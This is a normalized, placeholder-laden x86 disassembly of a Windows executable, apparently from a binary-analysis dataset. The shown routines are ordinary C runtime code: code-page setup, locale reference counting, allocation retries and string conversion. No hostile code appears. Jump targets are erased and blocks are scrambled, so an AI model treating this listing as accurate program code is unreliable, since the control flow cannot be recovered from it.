mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_4078d4
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_40b3d9
push 0x14
push r--data
call sub_408380
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_407823
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
call sub_4083c5
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rwxdata ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_40ff5b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b354
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b4b9
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_40b4c3
mov edi edi
push ebp
mov ebp esp
inc [ rwxdata ]
push 0x1000
call sub_40c01b
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_40b50c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_4078ae
mov [ eax ] 0x9
call sub_4078ae
mov [ eax ] 0x9
call sub_407823
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_40b562
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40b591
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_40c890
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rwxdata
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_40b5f5
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_4121cc
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_41209f
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_41209f
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_40c890
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_40b785
push 0xc
push r--data
call sub_408380
call sub_40af3b
mov edi eax
mov eax [ rwxdata ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rwxdata ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b820
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rwxdata ]
mov [ edi + 0x68 ] eax
mov esi [ rwxdata ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_4083c5
retn
push 0x20
call sub_40a4ef
cmp esi rwxdata
je r-xdata
push esi
call sub_409812
pop ecx
sub_40b829
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_406900
mov [ rwxdata ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rwxdata ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rwxdata ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rwxdata ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40b8a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_40b829
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_40b591
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40c890
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rwxdata ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rwxdata ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_40b562
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rwxdata ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_40b5f5
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rwxdata ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rwxdata ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40c890
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_40b562
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_40ba8e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_406900
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax [ eax + 0x4 ]
je r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
leave
retn
sub_40bacc
push 0x14
push r--data
call sub_408380
or [ ebp - 0x20 ] 0xffffffff
call sub_40af3b
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_40b785
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_40b829
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_40c01b
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_4083c5
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_40b8a5
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rwxdata
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rwxdata
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_409812
pop ecx
test [ rwxdata ] 0x1
jne r-xdata
push eax
call sub_409812
pop ecx
push 0xd
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rwxdata ] eax
mov eax [ ebx + 0x8 ]
mov [ rwxdata ] eax
mov eax [ ebx + 0xc ]
mov [ rwxdata ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rwxdata ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rwxdata ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rwxdata ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rwxdata ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rwxdata ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bc2d
jmp r-xdata
mov eax [ rwxdata ]
cmp eax rwxdata
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_409812
pop ecx
sub_40bc84
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rwxdata
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_40bd13
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rwxdata
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_40bdac
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rwxdata
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rwxdata
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_409812
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_409812
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_409812
push [ esi + 0xc0 ]
call sub_409812
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_412a0b
push [ esi + 0xd4 ]
call sub_409812
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rwxdata
je r-xdata
push esi
call sub_409812
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_409812
pop ecx
push [ esi + 0xb0 ]
call sub_409812
push [ esi + 0xbc ]
call sub_409812
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_409812
push [ esi + 0xbc ]
call sub_4130b8
pop ecx
pop ecx
push eax
call sub_409812
pop ecx
push eax
call sub_409812
push [ esi + 0xbc ]
call sub_412e2f
pop ecx
pop ecx
sub_40bef7
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_40bc84
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_40bd13
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rwxdata
je r-xdata
push esi
call sub_40bdac
pop ecx
sub_40bf44
push 0xc
push r--data
call sub_408380
call sub_40af3b
mov esi eax
mov eax [ rwxdata ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rwxdata ]
add esi 0x6c
push esi
call sub_40bef7
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bfb1
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_40af3b
mov esi [ eax + 0x6c ]
mov eax esi
call sub_4083c5
retn
push 0x20
call sub_40a4ef
sub_40bfbd
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rwxdata ]
call [ EncodePointer@IAT ]
mov [ edi + rwxdata ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_40bfe0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call [ Sleep@IAT ]
add esi 0x3e8
cmp esi [ rwxdata ]
jbe r-xdata
mov eax esi
pop esi
pop ebp
retn
or esi 0xffffffff
sub_40c01b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_409ff1
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_40c060
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413574
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40c0ac
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4135f6
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_40c0fa
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rwxdata ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rwxdata ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4136a3
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40c14c
push 0xc
push r--data
call sub_408380
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_407dff
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_407f17
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_407dff
add eax ebx
push eax
call sub_413711
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_407dff
add eax ebx
push eax
call sub_406a9f
mov [ ebp - 0x1c ] eax
call sub_407dff
add eax ebx
push eax
push edi
call sub_4137ad
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c1e0
mov eax [ ebp - 0x1c ]
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
call sub_4083c5
retn
sub_40c26e
mov edi edi
push ebp
mov ebp esp
mov ecx [ rwxdata ]
mov edx [ ebp + 0x8 ]
or ecx 0x1
xor eax eax
cmp [ rwxdata ] ecx
sete al
neg edx
sbb edx edx
and edx ecx
mov [ rwxdata ] edx
pop ebp
retn
sub_40c2b0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax rwxdata
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40c33b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_406900
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
call sub_407823
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_4078ae
mov [ eax ] 0x2a
call sub_4078ae
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_4078ae
push 0x22
pop esi
mov [ eax ] esi
call sub_407823
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_40c890
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_40c890
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40c4ad
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push [ ebp + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_406900
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push eax
call sub_40c33b
add esp 0x14
test eax eax
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x4 ]
jmp r-xdata
leave
retn
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_40c4fe
mov edi edi
push ebp
mov ebp esp
push ecx
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push [ ebp + 0xc ]
call sub_413cb8
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
call sub_40c33b
add esp 0x14
test eax eax
jne r-xdata
or eax 0xffffffff
leave
retn
mov eax [ ebp - 0x4 ]
leave
retn
sub_40c530
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_406900
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40c74f
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_40c775
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_413d6f
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
